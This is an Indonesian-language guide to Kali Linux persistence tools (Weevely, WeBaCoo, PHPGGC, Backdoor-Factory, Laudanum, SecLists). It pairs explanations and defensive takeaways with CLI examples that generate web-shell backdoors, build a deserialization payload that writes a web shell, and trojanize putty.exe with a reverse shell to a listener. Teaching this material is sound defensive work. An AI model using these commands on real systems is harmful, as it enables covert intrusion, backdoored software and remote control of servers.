# Persistence
# 🛠️ Persistence Tools - Kali Linux 

Dokumentasi ini berisi penjelasan mendalam mengenai berbagai perangkat lunak pasca-eksploitasi (*post-exploitation*) dan persistensi (*persistence*) yang terdapat dalam distribusi **Kali Linux**.

## 📋 Daftar Isi

1. [Weevely](#1-weevely)
2. [WeBaCoo (Web Backdoor Cookie)](#2-webacoo-web-backdoor-cookie)
3. [PHPGGC (PHP Generic Gadget Chains)](#3-phpggc-php-generic-gadget-chains)
4. [Backdoor-Factory](#4-backdoor-factory)
5. [Laudanum](#5-laudanum)
6. [SecLists](#6-seclists)

---

## 1. Weevely

> **Ringkasan:** Sebuah perkakas *stealth web shell* berbasis PHP yang disimulasikan untuk kebutuhan pasca-eksploitasi pada server web. Weevely digunakan untuk membuat *backdoor* kecil tersandi (*obfuscated*) di dalam direktori web target, sehingga *pentester* bisa terus mengirim perintah terminal jarak jauh lewat jalur HTTP biasa.

### 📄 Deskripsi Perangkat Lunak

Weevely adalah sebuah instrumen *open-source* berbasis Python yang dirancang khusus sebagai kerangka kerja pengelola *web shell* tersembunyi (*stealth web shell*) dan agen pasca-eksploitasi (*post-exploitation agent*) untuk aplikasi web berbasis bahasa pemrograman PHP. Di dalam taksonomi resmi Kali Linux, perangkat lunak ini diklasifikasikan ke dalam kategori **Persistence**.

Secara arsitektural, Weevely beroperasi dengan menghasilkan berkas agen PHP berukuran sangat kecil (umumnya kurang dari 1 kilobita) yang telah dikaburkan secara polimorfik (*polymorphic obfuscation*). Berbeda dengan *web shell* tradisional yang memiliki antarmuka HTML mencolok dan mudah dideteksi oleh pemindai antivirus, Weevely menyamarkan komunikasi *Command and Control* (C2) di dalam lalu lintas protokol HTTP/HTTPS standar menggunakan manipulasi *HTTP Headers* dan *Cookies*. Hal ini menjadikannya instrumen yang sangat efektif untuk mempertahankan akses jangka panjang pada server web yang telah dikompromi.

### 🎯 Kegunaan (Use Case) dalam Keamanan Siber

Dalam domain riset akademik, audit keamanan server web, dan operasi simulasi siber (*Red Teaming* dan *Blue Teaming*), Weevely diaplikasikan untuk skenario-skenario strategis berikut:

* **Simulasi Persistensi Akses (*Persistence Simulation*):** Membantu praktisi Red Team mendemonstrasikan bagaimana aktor ancaman mempertahankan akses tidak sah pada server web setelah berhasil mengeksploitasi celah unggah berkas (*Arbitrary File Upload*) atau injeksi kode jarak jauh (*Remote Code Execution*), meskipun celah awal tersebut nantinya ditambal (*patched*).
* **Evaluasi Pasca-Eksploitasi Lingkungan Web (*Web Post-Exploitation*):** Digunakan untuk mengaudit sejauh mana hak akses pengguna layanan web (seperti akun `www-data` pada Apache/Nginx) dapat dimanfaatkan untuk membaca konfigurasi sensitif, berinteraksi dengan basis data lokal, atau melakukan eskalasi hak istimewa.
* **Pengujian Sistem Deteksi Intrusi dan WAF (*Blue Team Benchmarking*):** Memungkinkan analis pertahanan menguji efektivitas *Web Application Firewall* (WAF), *Intrusion Detection System* (IDS), serta pemindai malware sisi server (seperti Maldet atau ClamAV) dalam mengenali berkas PHP yang dikaburkan dan lalu lintas C2 anomali berbasis HTTP.

### ⚙️ Fungsi Teknis (Functionality)

Weevely mengimplementasikan otomatisasi kontrol jarak jauh dan persistensi tingkat lanjut melalui lima mekanisme fungsional utama:

* **Generator Agen PHP Polimorfik (*Obfuscated Agent Generation*):** Menghasilkan skrip *backdoor* PHP yang unik setiap kali dibuat dengan mengacak nama variabel, struktur fungsi, dan pengkodean string, serta melindunginya dengan kata sandi (*password-protected*) agar hanya dapat diakses oleh penguji yang sah.
* **Komunikasi C2 Terenkripsi dan Tersamar (*Covert HTTP Channel*):** Mengenkapsulasi perintah eksekusi dan hasil keluaran di dalam bidang *HTTP Cookie* atau *Referer* yang disandikan menggunakan algoritma pengodean dan enkripsi berbasis kunci kata sandi, sehingga lalu lintas jaringan menyerupai permintaan penjelajahan web normal.
* **Sesi Terminal Interaktif (*Interactive Pseudo-Terminal*):** Menyediakan antarmuka baris perintah di mesin penguji yang menyimulasikan akses *shell* langsung pada sistem operasi server target, melewati batasan lingkungan eksekusi PHP standar.
* **Ekosistem Modul Pasca-Eksploitasi Terintegrasi:** Dilengkapi dengan lebih dari 30 modul siap pakai untuk mengotomatisasi berbagai tugas audit tanpa perlu mengunggah alat eksternal tambahan, meliputi:
  * **File System Operations:** Pengunggahan, pengunduhan, kompresi, dan modifikasi stempel waktu berkas (*timestomping*).
  * **Database Interaction:** Eksekusi kueri SQL dan ekstraksi isi basis data MySQL/PostgreSQL secara langsung menggunakan kredensial yang ditemukan pada berkas konfigurasi aplikasi (seperti `wp-config.php`).
  * **Network Pivoting & Tunneling:** Pemindaian port jaringan internal dan pembentukan terowongan proksi HTTP/SOCKS untuk menjangkau aset intranet di balik server web.
* **Evasi Pembatasan Fungsi PHP (*PHP Function Restriction Bypass*):** Secara cerdas mendeteksi fungsi eksekusi sistem yang dinonaktifkan pada konfigurasi `php.ini` (seperti `disable_functions` pada `system()` atau `exec()`), lalu beralih secara otomatis menggunakan metode alternatif (seperti pemanfaatan `proc_open`, `popen`, atau ekspansi pustaka) untuk tetap mengeksekusi perintah.

### 💻 Contoh Penggunaan CLI

```bash
# 1. Menghasilkan (generate) agen backdoor PHP tersandi dengan kata sandi khusus
weevely generate <kata_sandi> <jalur_output/agent.php>

# Contoh:
weevely generate secretpass123 agent.php

# 2. Terhubung ke agent PHP yang telah terunggah di server target melalui terminal interaktif
weevely <URL_target/agent.php> <kata_sandi>

# Contoh:
weevely http://example.com/uploads/agent.php secretpass123
```

> 💡 **Kesimpulan:**
> Secara akademis, Weevely merepresentasikan evolusi ancaman *web shell* modern yang menggabungkan teknik pengaburan kode statis dengan penyamaran komunikasi tingkat protokol aplikasi. Keberadaannya di Kali Linux menegaskan bahwa keamanan server web tidak hanya bergantung pada pencegahan eksploitasi awal, tetapi juga memerlukan pemantauan integritas berkas (*File Integrity Monitoring* / FIM), pembatasan hak tulis pada direktori publik web, serta inspeksi mendalam terhadap anomali lalu lintas HTTP masuk dan keluar.

---

## 2. WeBaCoo (Web Backdoor Cookie)

> **Ringkasan:** Perkakas pembuat *backdoor* web yang memanfaatkan taktik pengiriman data perintah tersembunyi di dalam header *Cookie HTTP*. Metode ini membantu mempertahankan akses ke server web target sekaligus mengelabui deteksi firewall aplikasi web (WAF).

### 📄 Deskripsi Perangkat Lunak

WeBaCoo (Web Backdoor Cookie) adalah sebuah instrumen *open-source* berbasis bahasa pemrograman Perl yang dirancang khusus sebagai *web backdoor* tersembunyi (*stealth web backdoor*) dan alat pasca-eksploitasi (*post-exploitation*) untuk server web berbasis PHP. Di dalam taksonomi resmi Kali Linux, perangkat lunak ini diklasifikasikan ke dalam kategori **Persistence**.

Secara arsitektural, WeBaCoo bekerja dengan memanfaatkan *HTTP Cookie Headers* sebagai saluran komunikasi rahasia (*covert channel*) antara klien penguji dan server target. Berbeda dengan *web shell* konvensional yang mengirimkan perintah eksekusi melalui parameter URL (`GET`) atau isi formulir (`POST`)—yang secara otomatis tercatat di dalam *access log* server web serta mudah dipindai oleh *Web Application Firewall* (WAF)—WeBaCoo menyematkan perintah dan hasil eksekusinya di dalam kolom *Cookie* dengan pengkodean Base64. Pendekatan ini meminimalkan jejak forensik dan menjaga persistensi akses secara senyap.

### 🎯 Kegunaan (Use Case) dalam Keamanan Siber

Dalam domain riset akademik, audit keamanan aplikasi web, dan operasi simulasi siber (*Red Teaming* dan *Blue Teaming*), WeBaCoo diaplikasikan untuk skenario-skenario strategis berikut:

* **Simulasi Persistensi Akses Tersembunyi (*Stealth Persistence*):** Membantu praktisi Red Team mempertahankan akses kendali jarak jauh pada server web yang telah terkompromi melalui celah eksekusi kode atau unggah berkas ilegal, tanpa memicu alarm keamanan berbasis pemindaian lalu lintas standar.
* **Evasi Sistem Deteksi dan Pencatatan Log (*Log & WAF Evasion*):** Digunakan untuk mendemonstrasikan kelemahan arsitektur pemantauan standar di mana administrator web hanya memeriksa parameter kueri URL pada log server, sementara muatan berbahaya melintas tanpa terdeteksi melalui header HTTP.
* **Evaluasi Pertahanan dan Forensik Jaringan (*Blue Team Benchmarking*):** Memungkinkan analis pertahanan menguji efektivitas aturan inspeksi paket mendalam (*Deep Packet Inspection* / DPI) pada IDS/IPS dan WAF dalam mendeteksi anomali ukuran maupun pola pengkodean data di dalam HTTP Cookie.

### ⚙️ Fungsi Teknis (Functionality)

WeBaCoo mengimplementasikan mekanisme pengaburan kode sisi server dan penyamaran komunikasi protokol melalui empat fungsi teknis utama:

* **Mode Generasi Kode Backdoor (*Generation Mode `-g`*):** Menghasilkan berkas skrip *backdoor* PHP mandiri yang sangat ringkas. Kode sumbernya dirancang menggunakan teknik pengaburan struktur (*obfuscated PHP code*) sehingga terhindar dari deteksi pemindai tanda tangan statis (*signature-based antivirus*).
* **Enkapsulasi Perintah Berbasis HTTP Cookie (*Cookie-Based Command Tunneling*):** Mengirimkan instruksi perintah sistem operasi dari klien ke server melalui parameter *Cookie* tertentu yang disandikan menggunakan Base64, serta mengembalikan hasil keluaran eksekusi perintah dari server ke klien melalui header respons `Set-Cookie` yang dibungkus oleh pembatas karakter (*delimiters*) khusus.
* **Mode Terminal Interaktif (*Terminal Mode `-t`*):** Menyediakan antarmuka baris perintah pseudo-terminal yang interaktif di sisi penguji, memungkinkan analis mengeksekusi perintah sistem operasi server secara *real-time* seolah-olah terhubung melalui sesi SSH lokal.
* **Dukungan Komunikasi Proksi dan Kustomisasi Header (*Proxy & Custom Header Support*):** Mengakomodasi pengiriman lalu lintas melalui server proksi eksternal (seperti Tor atau proksi HTTP/SOCKS) serta modifikasi string *User-Agent* guna menyamarkan identitas penguji agar menyerupai lalu lintas peramban web reguler.

### 💻 Contoh Penggunaan CLI

```bash
# 1. Menghasilkan berkas backdoor PHP tersandi
webacoo -g -o <nama_berkas.php>

# Contoh:
webacoo -g -o backdoor.php

# 2. Terhubung dan mengeksekusi terminal interaktif via Cookie HTTP
webacoo -t -u <URL_target/backdoor.php>

# Contoh:
webacoo -t -u http://example.com/uploads/backdoor.php
```

> 💡 **Kesimpulan:**
> Secara akademis, WeBaCoo membuktikan bahwa penyalahgunaan mekanisme standar protokol HTTP—khususnya manajemen *state* melalui *Cookie*—dapat diubah menjadi saluran komunikasi *Command and Control* yang sulit terdeteksi oleh sistem pemantauan konvensional. Keberadaannya di Kali Linux menegaskan pentingnya penerapan pencatatan log HTTP secara menyeluruh (termasuk inspeksi headers), pembatasan fungsi eksekusi sistem pada konfigurasi PHP (`disable_functions`), serta pemantauan integritas berkas di lingkungan server produksi.

---

## 3. PHPGGC (PHP Generic Gadget Chains)

> **Ringkasan:** Sebuah alat bantu untuk menghasilkan payload serialisasi objek PHP. Dalam fase persistensi, alat ini digunakan untuk memanfaatkan celah deserialisasi tidak aman pada aplikasi web agar dapat memicu eksekusi kode berkelanjutan atau menanamkan hak akses konstan.

### 📄 Deskripsi Perangkat Lunak

PHPGGC (PHP Generic Gadget Chains) adalah sebuah perpustakaan (*library*) dan utilitas baris perintah *open-source* berbasis PHP yang dirancang khusus untuk menghasilkan muatan eksploitasi (*payloads*) pada kerentanan *PHP Object Injection* (POI) atau *Insecure Deserialization*. Di dalam taksonomi resmi Kali Linux, perangkat lunak ini diklasifikasikan ke dalam kategori **Persistence**.

Secara arsitektural, PHPGGC bertindak serupa dengan alat `ysoserial` pada ekosistem Java. Alat ini mengonsolidasikan kumpulan *Property-Oriented Programming* (POP) *Gadget Chains*—yaitu rangkaian kelas dan metode sihir (*magic methods* seperti `__destruct()`, `__wakeup()`, atau `__toString()`) yang sudah ada secara sah di dalam framework atau pustaka PHP populer (seperti Laravel, Symfony, WordPress, Drupal, Yii, dan Monolog). Ketika aplikasi target melakukan deserialisasi (`unserialize()`) terhadap input yang tidak tepercaya, PHPGGC menyusun struktur objek berseri yang memanipulasi alur kontrol program untuk mencapai eksekusi kode arbitrer (*Remote Code Execution*), penulisan berkas (*arbitrary file write*), atau penghapusan berkas.

### 🎯 Kegunaan (Use Case) dalam Keamanan Siber

Dalam domain riset akademik, audit kode sumber, dan operasi simulasi siber (*Red Teaming* dan *Blue Teaming*), PHPGGC diaplikasikan untuk skenario-skenario strategis berikut:

* **Validasi Kerentanan Insecure Deserialization:** Membantu penguji penetrasi (*penetration tester*) membuktikan dampak kritis dari penggunaan fungsi `unserialize()` pada input pengguna yang tidak tersanitasi, mengonversi temuan teoretis menjadi eksploitasi nyata di lingkungan target.
* **Penanaman Backdoor dan Persistensi Aplikasi Web:** Digunakan dalam simulasi ofensif untuk menulis skrip *web shell* permanen ke direktori publik server melalui *gadget chain* berbasis manipulasi sistem berkas (*file write gadgets*), sehingga mempertahankan akses jangka panjang pada infrastruktur target.
* **Audit Keamanan Dependensi Pihak Ketiga (*Supply Chain & Framework Auditing*):** Memungkinkan pengembang dan tim pertahanan (Blue Team) mengevaluasi risiko yang ditimbulkan oleh pustaka pihak ketiga (via Composer) di dalam proyek PHP, sekaligus menguji keandalan aturan *Web Application Firewall* (WAF) dalam memblokir muatan objek berseri yang berbahaya.

### ⚙️ Fungsi Teknis (Functionality)

PHPGGC mengimplementasikan otomatisasi rekayasa muatan deserialisasi tingkat lanjut melalui lima mekanisme fungsional utama:

* **Katalog Gadget Chains Multi-Framework:** Menyediakan basis data terstruktur yang berisi puluhan rantai eksploitasi siap pakai untuk berbagai framework dan pustaka PHP (seperti Laravel/RCE, Symfony/RCE, Monolog/RCE, Guzzle/FW), lengkap dengan informasi versi yang rentan serta jenis dampak yang dihasilkan (RCE, File Write, File Read, atau File Delete).
* **Manipulasi Pengkodean dan Pengaburan Muatan (*Payload Encoding & Obfuscation*):** Menyediakan fitur pemrosesan string otomatis untuk menghindari kerusakan struktur byte akibat karakter null (`\x00`) pada properti kelas *private/protected* PHP, meliputi pengkodean Base64 (`-b`), pengkodean URL (`-u`), format JSON, hingga konversi heksadesimal ASCII (`-a`).
* **Pembuatan Arsip PHAR Berbahaya (*PHAR Deserialization Generator*):** Mampu mengemas muatan *gadget chain* ke dalam metadata berkas arsip PHAR (PHP Archive) menggunakan opsi `-p phar`. Fitur ini memungkinkan eksploitasi kerentanan deserialisasi secara tidak langsung melalui fungsi manipulasi berkas standar (seperti `file_exists()`, `fopen()`, atau `md5_file()`) menggunakan pembungkus aliran `phar://` tanpa memerlukan pemanggilan fungsi `unserialize()` secara eksplisit.
* **Penyesuaian Tanda Tangan Kriptografi (*Wrapper & Signature Customization*):** Mengizinkan penguji membungkus muatan yang dihasilkan dengan skrip PHP kustom atau mekanisme penandatanganan HMAC/enkripsi spesifik aplikasi (misalnya kunci `APP_KEY` pada Laravel) agar muatan dapat diterima oleh mekanisme validasi integritas sesi target.
* **Deteksi Versi dan Pengujian Cepat (*Fast Brute-Force / Chain Testing*):** Mendukung ekstraksi cepat beberapa variasi *gadget chain* secara bersamaan untuk mengidentifikasi rantai yang kompatibel ketika versi pasti pustaka atau framework yang digunakan oleh server target tidak diketahui secara spesifik.

### 💻 Contoh Penggunaan CLI

```bash
# 1. Menampilkan daftar seluruh Gadget Chain yang tersedia
phpggc -l

# 2. Menghasilkan payload RCE untuk Monolog dalam format ter-encode Base64 (-b)
phpggc Monolog/RCE1 system "id" -b

# 3. Menghasilkan payload penulisan berkas (File Write) untuk menanam web shell
phpggc SwiftMailer/FW1 /var/www/html/shell.php ./lokal_shell.php
```

> 💡 **Kesimpulan:**
> Secara akademis, PHPGGC membuktikan konsep *Property-Oriented Programming* (POP), di mana penyerang tidak perlu menyuntikkan kode baru ke dalam server, melainkan cukup merangkai ulang logika objek dan metode yang sudah tersedia secara sah di dalam arsitektur aplikasi. Keberadaannya di Kali Linux menegaskan bahwa fungsi `unserialize()` di PHP tidak boleh pernah digunakan untuk memproses data eksternal yang tidak tepercaya; pengembang wajib beralih menggunakan format pertukaran data yang aman seperti JSON (`json_decode()`) guna memutus vektor serangan injeksi objek secara permanen.

---

## 4. Backdoor-Factory

> **Ringkasan:** Perkakas yang digunakan untuk memodifikasi biner asli (seperti file berkstensi `.exe` atau biner Linux ELF) dengan menyuntikkan muatan kode (*shellcode*) tambahan. Ketika pengguna menjalankan aplikasi resmi tersebut, biner yang telah dimodifikasi akan mengeksekusi *backdoor* di latar belakang tanpa disadari.

### 📄 Deskripsi Perangkat Lunak

The Backdoor Factory (BDF) atau `backdoor-factory` adalah sebuah instrumen pengujian penetrasi *open-source* berbasis Python yang dirancang khusus untuk menyisipkan (*patching*) kode instruksi mesin (*shellcode*) ke dalam berkas biner yang sah (*legitimate executables*). Di dalam taksonomi resmi Kali Linux, perangkat lunak ini diklasifikasikan ke dalam kategori **Persistence**.

Secara arsitektural, BDF membedah struktur format biner lintas platform—meliputi PE (*Portable Executable*) untuk sistem operasi Windows (`.exe`, `.dll`), ELF (*Executable and Linkable Format*) untuk sistem berbasis Unix/Linux, serta Mach-O untuk ekosistem macOS. Perangkat ini bekerja dengan memanfaatkan ruang kosong alami (*code caves*) di dalam berkas biner target atau menambahkan seksi (*section*) baru, lalu memodifikasi alur eksekusi instruksi agar muatan eksploitasi dijalankan tanpa merusak fungsionalitas normal dari aplikasi induk tersebut.

### 🎯 Kegunaan (Use Case) dalam Keamanan Siber

Dalam domain riset akademik, rekayasa balik (*reverse engineering*), dan simulasi keamanan siber (*Red Teaming* dan *Blue Teaming*), Backdoor-Factory diaplikasikan untuk skenario-skenario strategis berikut:

* **Simulasi Persistensi Biner (*Binary Persistence Simulation*):** Membantu praktisi Red Team mempertahankan akses jangka panjang pada sistem target dengan memodifikasi berkas aplikasi yang sering dijalankan oleh pengguna atau layanan sistem, sehingga akses *backdoor* kembali aktif setiap kali aplikasi sah tersebut dibuka.
* **Trojanisasi Perangkat Lunak (*Software Trojanization & Supply Chain Audit*):** Digunakan untuk mendemonstrasikan risiko keamanan ketika pengguna mengunduh installer atau aplikasi utilitas dari sumber tidak tepercaya (atau melalui serangan Man-in-the-Middle seperti BDFProxy), di mana aplikasi tetap berjalan normal secara visual namun mengeksekusi implan di latar belakang.
* **Pengujian Ketahanan Deteksi Antivirus dan Kontrol Aplikasi (*Blue Team Benchmarking*):** Memungkinkan analis pertahanan mengevaluasi efektivitas pemindai tanda tangan statis (*static signature antivirus*) dan mekanisme *Application Whitelisting* dalam mendeteksi modifikasi struktural pada berkas biner yang sebelumnya dianggap bersih.

### ⚙️ Fungsi Teknis (Functionality)

Backdoor-Factory mengimplementasikan manipulasi biner tingkat rendah dan pemulihan alur eksekusi melalui lima mekanisme fungsional utama:

* **Deteksi dan Pemanfaatan Code Caves (*Code Cave Discovery & Utilization*):** Memindai struktur biner target untuk menemukan serangkaian byte kosong (`0x00` / null bytes) yang dihasilkan oleh penyelarasan kompilator (*compiler alignment*) antar-seksi memori. BDF menyisipkan *shellcode* ke dalam ruang kosong tersebut sehingga ukuran keseluruhan berkas (*file size*) tidak mengalami perubahan mencolok.
* **Injeksi Seksi Biner Baru (*New Section Injection*):** Apabila ruang *code cave* yang tersedia tidak mencukupi ukuran *payload*, BDF memiliki fungsi untuk membuat seksi PE/ELF baru dengan izin eksekusi memori yang sesuai (READ/WRITE/EXECUTE) guna menampung muatan yang lebih besar.
* **Pembajakan Alur Eksekusi dan Lompatan (*Execution Flow Hijacking & Trampolining*):** Memodifikasi titik masuk (*Entry Point*) atau menyisipkan instruksi lompatan rakitan (Assembly `JMP`/`CALL`) di tengah alur kode asli aplikasi untuk mengarahkan prosesor mengeksekusi *shellcode* terlebih dahulu.
* **Restorasi Konteks dan Kelangsungan Proses (*Register Preservation & Thread Continuation*):** Menyematkan instruksi khusus (seperti `PUSHAD`/`PUSHFD` dan `POPAD`/`POPFD` pada arsitektur x86) sebelum dan sesudah eksekusi *shellcode*, serta menjalankan *shellcode* dalam thread terpisah (*non-blocking execution*). Hal ini menjamin aplikasi induk tidak mengalami hang atau crash saat implan berjalan di latar belakang.
* **Katalog Muatan Terintegrasi dan Dukungan Kustom:** Menyediakan puluhan *shellcode* bawaan lintas arsitektur (x86 dan x64)—seperti Reverse TCP Shell dan Meterpreter—sekaligus mendukung injeksi *shellcode* mentah kustom hasil generator eksternal (seperti MSFvenom atau Donut).

### 💻 Contoh Penggunaan CLI

```bash
# 1. Memeriksa ketersediaan Code Caves pada berkas biner Windows (.exe)
backdoor-factory -f <nama_file.exe> -c

# 2. Menyisipkan payload reverse shell ke dalam biner target
backdoor-factory -f <nama_file.exe> -s reverse_shell_tcp -H <IP_listener> -P <PORT_listener>

# Contoh:
backdoor-factory -f putty.exe -s reverse_shell_tcp -H 192.168.1.10 -P 4444
```

> 💡 **Kesimpulan:**
> Secara akademis, Backdoor-Factory mendemonstrasikan kerentanan integritas pada level format berkas biner (*executable format*), di mana ruang kosong struktur internal dapat dimanfaatkan untuk menyusupkan logika eksekusi asing tanpa mengubah perilaku eksternal program. Keberadaannya di Kali Linux menegaskan urgensi penerapan *Code Signing* (penandatanganan digital kriptografis), verifikasi integritas hash (SHA-256) sebelum distribusi perangkat lunak, serta pemantauan anomali modifikasi berkas biner (*File Integrity Monitoring*) di lingkungan produksi.

---

## 5. Laudanum

> **Ringkasan:** Kumpulan file *backdoor* siap pakai yang disuntikkan secara khusus ke berbagai jenis platform aplikasi web (seperti PHP, ASP, JSP). Setelah berhasil diunggah ke server target, skrip-skrip ini berfungsi sebagai pintu masuk permanen bagi penguji keamanan.

### 📄 Deskripsi Perangkat Lunak

Laudanum adalah sebuah koleksi berkas muatan (*payloads*) dan *web shell* siap pakai berbasis *open-source* yang dirancang untuk memfasilitasi fase pasca-eksploitasi (*post-exploitation*) pada server aplikasi web. Di dalam taksonomi resmi Kali Linux, perangkat lunak ini diklasifikasikan ke dalam kategori **Persistence**.

Secara arsitektural, berbeda dengan kerangka kerja dinamis seperti Weevely atau WeBaCoo yang menghasilkan agen terenkripsi melalui antarmuka baris perintah, Laudanum berbentuk repositori statis yang berisi templat skrip *backdoor* dalam berbagai bahasa pemrograman sisi server (*server-side languages*), meliputi PHP, ASP, ASPX, JSP, ColdFusion (CFM), serta WordPress Plugin. Setiap skrip dirancang secara mandiri agar dapat langsung diunggah (*drop-in execution*) ke direktori web target untuk menjembatani celah kerentanan aplikasi menuju penguasaan sistem operasi server.

### 🎯 Kegunaan (Use Case) dalam Keamanan Siber

Dalam domain riset akademik, audit keamanan aplikasi web, dan operasi simulasi siber (*Red Teaming* dan *Blue Teaming*), Laudanum diaplikasikan untuk skenario-skenario strategis berikut:

* **Validasi Celah Unggah Berkas (*Arbitrary File Upload Validation*):** Membantu penguji penetrasi (*penetration tester*) membuktikan dampak kritis dari kerentanan *unrestricted file upload* dengan mengunggah skrip *web shell* yang sesuai dengan stack teknologi server target (misalnya berkas `.aspx` untuk server Microsoft IIS atau `.jsp` untuk Apache Tomcat).
* **Penanaman Akses Persisten Lintas Platform (*Cross-Platform Persistence*):** Digunakan dalam simulasi ofensif untuk mempertahankan kendali jarak jauh pada beragam arsitektur server web, termasuk melalui penyamaran sebagai ekstensi atau plugin sah pada sistem manajemen konten (CMS) seperti WordPress.
* **Evaluasi Sistem Deteksi dan Antivirus Server (*Blue Team Benchmarking*):** Memungkinkan analis pertahanan menguji keandalan aturan tanda tangan (*signature rules*) pada *Web Application Firewall* (WAF), *Intrusion Detection System* (IDS), dan pemindai malware sisi server dalam mendeteksi pola struktur kode *web shell* yang telah dikenal secara luas.

### ⚙️ Fungsi Teknis (Functionality)

Laudanum mengimplementasikan fungsionalitas kontrol jarak jauh dan manipulasi infrastruktur web melalui lima komponen utama:

* **Eksekusi Perintah Sistem Interaktif (*Web-Based Command Execution*):** Menyediakan antarmuka berbasis peramban web (web GUI) yang memungkinkan penguji mengeksekusi perintah sistem operasi (*OS commands*) secara langsung di server target dalam konteks hak akses pengguna layanan web (seperti `www-data` atau `IIS_IUSRS`).
* **Pembuatan Koneksi Balik (*Reverse Shell Triggering*):** Mengintegrasikan skrip khusus (seperti `php-reverse-shell.php`) yang dirancang untuk menginisiasi koneksi jaringan keluar (*outbound TCP connection*) dari server target menuju mesin pendengar (*listener* seperti Netcat atau Metasploit) milik penguji.
* **Penjelajahan dan Manipulasi Sistem Berkas (*File System Browser & Transfer*):** Menyediakan modul navigasi direktori visual yang memungkinkan analis membaca berkas konfigurasi sensitif, mengunduh basis data lokal, serta mengunggah berkas biner tambahan tanpa perlu menggunakan perintah terminal manual.
* **Penyamaran Ekstensi CMS (*Malicious WordPress Plugin Packaging*):** Menyertakan templat berkas arsip `.zip` siap instalasi untuk platform WordPress, mendemonstrasikan bagaimana hak akses administrator dasbor CMS dapat dieskalasi menjadi eksekusi kode di tingkat sistem operasi server melalui fitur instalasi plugin bawaan.
* **Pembatasan Akses Berbasis Daftar Putih IP (*IP-Based Access Control*):** Setiap templat skrip di dalam Laudanum dilengkapi dengan variabel konfigurasi alamat IP yang diizinkan (`$allowedIPs`), memastikan bahwa *web shell* yang telah diunggah ke server publik tidak dapat diakses atau dibajak oleh pihak luar lainnya selama proses audit berlangsung.

### 💻 Contoh Penggunaan CLI

```bash
# 1. Menelusuri direktori repositori Laudanum di Kali Linux
ls -la /usr/share/laudanum/

# 2. Menyalin templat web shell PHP ke direktori kerja saat ini
cp /usr/share/laudanum/php/php-reverse-shell.php ./shell.php

# 3. Mengedit konfigurasi IP yang diizinkan ($allowedIPs) sebelum diunggah
nano ./shell.php
```

> 💡 **Kesimpulan:**
> Secara akademis, Laudanum merepresentasikan standardisasi artefak pasca-eksploitasi lintas platform yang menyoroti risiko laten dari kegagalan validasi unggah berkas serta manajemen hak akses direktori pada server web. Keberadaannya di Kali Linux menegaskan pentingnya penerapan mekanisme pertahanan berlapis, meliputi validasi tipe berkas berbasis konten (*MIME-type & magic bytes inspection*), penonaktifan izin eksekusi skrip pada direktori unggahan publik, serta pemantauan integritas berkas (*File Integrity Monitoring*) secara berkala.

---

## 6. SecLists

> **Ringkasan:** Meskipun merupakan koleksi daftar kata (*wordlists*) universal, dalam konteks fase persistensi, SecLists menyediakan berbagai templat skrip *backdoor*, konfigurasi akun, dan muatan data *web shell* yang sering digunakan untuk disisipkan ke sistem target.

### 📄 Deskripsi Perangkat Lunak

SecLists adalah sebuah repositori dan kompilasi daftar kata (*wordlists*), kamus data, serta vektor muatan pengujian (*fuzzing payloads*) berbasis *open-source* yang dikurasi secara khusus untuk penilaian keamanan informasi (*security assessment*). Di dalam taksonomi resmi Kali Linux, paket ini diklasifikasikan ke dalam dua kategori taktis: **Persistence** dan **Credential Access** (di bawah sub-kategori *Password Profiling & Wordlists*).

Secara struktural, berbeda dengan perangkat lunak eksekusi mandiri, SecLists berperan sebagai basis data referensi statis (*static knowledge base*) yang terinstal di direktori sistem (`/usr/share/seclists`). Paket ini mengonsolidasikan jutaan entri string—mulai dari nama pengguna, kata sandi bocor, jalur direktori web, nama subdomain, hingga pola injeksi kode—yang menjadi bahan bakar utama bagi berbagai mesin otomasi pengujian penetrasi (seperti Gobuster, FFUF, Hydra, Burp Suite, dan SQLmap).

### 🎯 Kegunaan (Use Case) dalam Keamanan Siber

Dalam domain riset akademik, audit kerentanan, dan operasi simulasi siber (*Red Teaming* dan *Blue Teaming*), SecLists diaplikasikan untuk skenario-skenario strategis berikut:

* **Otomasi Penemuan Permukaan Serangan (*Attack Surface Discovery*):** Membantu penguji penetrasi (*penetration tester*) melakukan enumerasi jalur direktori tersembunyi, berkas cadangan (*backup files*), parameter API, serta subdomain target secara sistematis melalui teknik *brute-force* berbasis kamus.
* **Audit Kekuatan Kredensial dan Otentikasi (*Credential & Authentication Auditing*):** Digunakan untuk mengevaluasi ketahanan mekanisme login terhadap serangan *dictionary attack* dan *credential stuffing* dengan menguji kombinasi kredensial bawaan pabrik (*default credentials*) maupun kata sandi yang paling sering digunakan secara global.
* **Pengujian Ketangguhan Validasi Input (*Fuzzing & Input Validation Testing*):** Memungkinkan analis keamanan dan pengembang menguji bagaimana aplikasi web memproses karakter anomali atau vektor eksploitasi (seperti SQL Injection, XSS, LFI, dan Command Injection) guna mengidentifikasi celah keamanan serta mengevaluasi efektivitas aturan *Web Application Firewall* (WAF).
* **Penanaman Artefak dan Skrip Web (*Web Shell & Payload Referencing*):** Menyediakan koleksi templat *web shell* dan *backdoor* siap pakai yang dapat dimanfaatkan dalam skenario uji coba persistensi pada server web yang memiliki celah unggah berkas.

### ⚙️ Fungsi Teknis (Functionality)

SecLists mengorganisasi jutaan data pengujiannya ke dalam taksonomi direktori modular yang terstruktur berdasarkan fase serangan dan target teknologi:

* **Direktori `Discovery` (Pemetaan Aset dan Konten):** Menyediakan kamus terkurasi untuk enumerasi infrastruktur, meliputi daftar jalur direktori web dan CMS (`Discovery/Web-Content`), daftar nama subdomain untuk resolusi DNS (`Discovery/DNS`), nama berkas sensitif, serta daftar nama pengguna layanan (*usernames*) untuk protokol SMTP, SNMP, dan Active Directory.
* **Direktori `Passwords` (Kamus Kredensial dan Profil Kata Sandi):** Mengintegrasikan kumpulan besar basis data kata sandi historis dari kebocoran data publik (seperti kompilasi RockYou dan Darkweb), daftar kredensial bawaan perangkat keras/lunak (`Default-Credentials`), serta kamus kata sandi spesifik bahasa atau industri.
* **Direktori `Fuzzing` (Vektor Eksploitasi dan Anomali Input):** Berisi ribuan string pengujian terstandardisasi untuk mendeteksi celah logika dan memori pada aplikasi, mencakup vektor muatan SQL Injection, Cross-Site Scripting (XSS), Local/Remote File Inclusion (LFI/RFI), Server-Side Template Injection (SSTI), XML External Entity (XXE), serta karakter kontrol buffer overflow.
* **Direktori `Web-Shells` dan `Payloads` (Artefak Pasca-Eksploitasi):** Menyediakan kumpulan skrip *web shell* ringkas dalam berbagai bahasa (PHP, ASP, JSP, ColdFusion) serta templat muatan eksploitasi siap pakai untuk memvalidasi dampak eksekusi kode jarak jauh dan persistensi sistem.
